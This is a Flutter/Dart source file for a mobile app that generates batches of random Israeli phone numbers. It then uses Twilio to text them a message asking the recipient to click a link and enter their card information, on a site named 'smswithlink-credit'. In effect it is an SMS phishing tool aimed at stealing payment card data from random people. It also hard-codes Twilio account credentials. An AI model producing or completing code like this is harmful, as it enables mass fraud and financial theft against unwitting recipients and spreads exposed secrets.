import 'dart:math';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:get/get.dart';
import 'package:twilio_flutter/twilio_flutter.dart';

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter Demo',
      theme: ThemeData(
        // This is the theme of your application.
        //
        // TRY THIS: Try running your application with "flutter run". You'll see
        // the application has a blue toolbar. Then, without quitting the app,
        // try changing the seedColor in the colorScheme below to Colors.green
        // and then invoke "hot reload" (save your changes or press the "hot
        // reload" button in a Flutter-supported IDE, or press "r" if you used
        // the command line to start the app).
        //
        // Notice that the counter didn't reset back to zero; the application
        // state is not lost during the reload. To reset the state, use hot
        // restart instead.
        //
        // This works for code too, not just values: Most code changes can be
        // tested with just a hot reload.
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.deepPurple),
        useMaterial3: true,
      ),
      home: MyHomePage(),
    );
  }
}

class MyHomePage extends StatelessWidget {
  final PhoneNumberController phoneNumberController =
      Get.put(PhoneNumberController());

  MyHomePage({super.key});
  @override
  Widget build(BuildContext context) {
    // This method is rerun every time setState is called, for instance as done
    // by the _incrementCounter method above.
    //
    // The Flutter framework has been optimized to make rerunning build methods
    // fast, so that you can just rebuild anything that needs updating rather
    // than having to individually change instances of widgets.
    return Scaffold(
      backgroundColor: const Color.fromARGB(255, 231, 227, 227),
      appBar: AppBar(
        title: const Text('Generate Phone Number'),
      ),
      body: Column(
        children: [
          const SizedBox(
            height: 100,
          ),
          Text(
            'Enter the amount of phone numbers you want to generate'.tr,
            style: const TextStyle(
              color: Colors.white,
              fontSize: 18,
              fontWeight: FontWeight.bold,
              letterSpacing: 1,
              wordSpacing: 1,
              height: 1.5,
              fontFamily: 'Poppins',
              decoration: TextDecoration.none,
              decorationColor: Colors.white,
              decorationStyle: TextDecorationStyle.solid,
              decorationThickness: 1,
            ),
          ),
          const SizedBox(
            height: 20,
          ),
          Container(
            padding: const EdgeInsets.all(20),
            // margin:,

            child: TextField(
              controller: phoneNumberController.amountController.value,
              keyboardType: TextInputType.number,
              inputFormatters: [FilteringTextInputFormatter.digitsOnly],
              style: const TextStyle(
                color: Colors.white,
                fontSize: 18,
                fontWeight: FontWeight.bold,
                letterSpacing: 1,
                wordSpacing: 1,
                height: 1.5,
                // fontFamily: 'Poppins',
                decoration: TextDecoration.none,
                decorationColor: Colors.white,
                decorationStyle: TextDecorationStyle.solid,
                decorationThickness: 1,
              ),
              decoration: const InputDecoration(
                labelText: 'Amount of phone numbers',
                labelStyle: TextStyle(
                  color: Colors.white,
                  fontSize: 18,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 1,
                  wordSpacing: 1,
                  height: 1.5,
                  fontFamily: 'Poppins',
                  decoration: TextDecoration.none,
                  decorationColor: Colors.white,
                  decorationStyle: TextDecorationStyle.solid,
                  decorationThickness: 1,
                ),
                filled: true,
                fillColor: Color.fromRGBO(139, 132, 132, 1),
                focusedBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.all(Radius.circular(10)),
                  borderSide: BorderSide(
                    color: Color.fromRGBO(139, 132, 132, 1),
                  ),
                  // focusedColor: const Color.fromRGBO(139, 132, 132, 1),
                ),
                enabledBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.all(Radius.circular(10)),
                  borderSide: BorderSide(
                    color: Color.fromRGBO(139, 132, 132, 1),
                  ),
                  // focusedColor: Color.fromARGB(255, 201, 154, 154),
                ),
              ),
            ),
          ),
          const SizedBox(
            height: 20,
          ),
          const SizedBox(height: 16),
          ElevatedButton(
              // statesController: / ,
              onPressed: () {
                if (phoneNumberController.generatedPhoneNumbers.isEmpty) {
                  // alert getx told user should generate a phone numbers

                  Get.snackbar(
                    'Generate Phone Numbers'.tr,
                    'You should have a list of phone numbers, /n Please enter the amount of phone numbers you want to generate'
                        .tr,
                    backgroundColor: Colors.red,
                    duration: const Duration(seconds: 2),
                    snackPosition: SnackPosition.BOTTOM,
                    margin: const EdgeInsets.only(bottom: 20),
                  );
                } else {
                  sendSmsWithLink(
                    // ignore: invalid_use_of_protected_member
                    phoneNumberController.generatedPhoneNumbers.value,
                  );
                  phoneNumberController.generatedPhoneNumbers.clear();
                }
              },
              child: const Text('Send SMS with Link')),
          const SizedBox(
            height: 20,
          ),
          const SizedBox(height: 16),
          ElevatedButton(
            onPressed: phoneNumberController.generatePhoneNumber,
            style: ElevatedButton.styleFrom(
              foregroundColor: Colors.white,
              backgroundColor: const Color.fromRGBO(139, 132, 132, 1),
              shape: const RoundedRectangleBorder(
                borderRadius: BorderRadius.all(Radius.circular(25)),
                side: BorderSide(
                  color: Color.fromRGBO(139, 132, 132, 1),
                ),
                // focusedColor: Color.fromARGB(255, 201, 154, 154),
              ),
              elevation: 0,
            ),
            child: const Text('Generate'),
            // onPressed: phoneNumberController.generatePhoneNumber,
          ),
          const SizedBox(
            height: 20,
          ),
          Expanded(
            child:
                //make teh econtainer has a shafdow and like a table
                Container(
                    decoration: const BoxDecoration(
                        // color:

                        ),
                    child: Obx(
                      () => SingleChildScrollView(child: columnOfNumbers()),
                    )),
          ),
        ],
      ),
      // floatingActionButtonLocation:
      //     FloatingActionButtonLocation.miniCenterDocked,
      // floatingActionButton: FloatingActionButton(
      //   onPressed: phoneNumberController.generatePhoneNumber,
      //   child: const Icon(Icons.play_circle_fill_outlined),
      // ),
    );
  }

  columnOfNumbers() {
    final widgets = <Widget>[];
    for (int i = 0;
        i < phoneNumberController.generatedPhoneNumbers.length;
        i++) {
      widgets.add(Column(
        children: [
          Text(
            phoneNumberController.generatedPhoneNumbers[i],
            style: const TextStyle(
              color: Colors.white,
              fontSize: 18,
              fontWeight: FontWeight.bold,
              letterSpacing: 1,
              wordSpacing: 1,
              height: 1.5,
              fontFamily: 'Poppins',
              decoration: TextDecoration.none,
              decorationColor: Colors.white,
              decorationStyle: TextDecorationStyle.solid,
              decorationThickness: 1,
            ),
            textAlign: TextAlign.center,
          ),
          const SizedBox(
            height: 10,
          ),
          const Divider(
            color: Colors.white,
            thickness: 1,
          ),
        ],
      ));
    }
    return Column(
      children: widgets,
    );
  }
}

// PhoneNumberController class as GetXController

class PhoneNumberController extends GetxController {
  // Create an RxString to hold the generated phone number
  // final generatedPhoneNumber = ''.obs;
  // array will contain a generated phone numbers
  final generatedPhoneNumbers = <String>[].obs;
  final amountController = TextEditingController().obs;

  // Method to generate the phone number and update the RxString
  generatePhoneNumber() async {
    print('generate method enter ');
    // Generate a random phone number
    // print the controller text value after each step
    print("amoiunt =  ${amountController.value.text}" ?? '0');
    if (amountController.value.text == '' ||
        amountController.value.text == '0') {
      generatedPhoneNumbers.clear();
      // show alert that told the user should enter amount of phone numbers
      const SnackBar(
        duration: Duration(seconds: 3),
        dismissDirection: DismissDirection.startToEnd,
        shape: BeveledRectangleBorder(),
        showCloseIcon: bool.fromEnvironment("exit"),
        content: Text(
            'You should have a list of phone numbers, /n Please enter the amount of phone numbers you want to generate'),
      );
      // Get.snackbar(
      //   'Error',
      //   'Please enter amount of phone numbers',
      //   duration: Duration(seconds: 4),
      //   backgroundColor: Colors.red,
      //   colorText: Colors.white,
      //   snackPosition: SnackPosition.BOTTOM,
      // );
    } else {
      // loop the amount of numbers and add to the array
      // check if the amount is 1 or more
      for (int i = 0;
          i <
              int.parse(
                amountController.value.text,
              );
          i++) {
        generatedPhoneNumbers.add(generateIsraelPhoneNumber());
      }
    }
    // String phoneNumber = await generateRandomIsraeliPhoneNumber();
    // generatedPhoneNumber.value = phoneNumber;
  }
}

Future<void> sendSmsWithLink(List<String> phoneNumbers) async {
  final twilioFlutter = TwilioFlutter(
    accountSid: 'ACc5b379d2b96412f20fbd480311751f9b',
    authToken: '157b64d0e85e4b1a2df6d8e78f5b64e1',
    twilioNumber: '+16208378054',
  );

  // Generate a unique link or use your own link to the card information form
  String? uniqueLink = 'https://smswithlink-credit.netlify.app';

  for (String phoneNumber in phoneNumbers) {
    try {
      await twilioFlutter.sendSMS(
        // toNumber:
        //  phoneNumber.replaceFirst('00', '+'),
        toNumber: '+962781617524', // Example phone number for testing
        // from: 'Your Company',
        // subject: 'Card Information',
        messageBody:
            'Click on the link below to enter your card information:\n$uniqueLink',
      );
      print('the $phoneNumber was  SMS sent successfully!');
    } catch (e) {
      print('Failed to send SMS: $e');
    } finally {
      print('Finish to send SMS: $phoneNumber');
    }
  }
}

const _israelPhoneNumberRegex = r'^009725\d{8}$';

String generateIsraelPhoneNumber() {
  // print
  print('generateIsraelPhoneNumber ------------------------------------');
  var phoneNumber = '';
  print('phoen number in generrrrr  = $phoneNumber');
  do {
    print('phoen number in generrrrr in dooooo = $phoneNumber');

    phoneNumber = '009725${Random().nextInt(100000000)}';
  } while (!validateIsraelPhoneNumber(phoneNumber));
  return phoneNumber;
}

bool validateIsraelPhoneNumber(String phoneNumber) {
  // print
  print('validateIsraelPhoneNumber ------------------------------------');
  final regex = RegExp(_israelPhoneNumberRegex);

  return regex.hasMatch(phoneNumber);
}
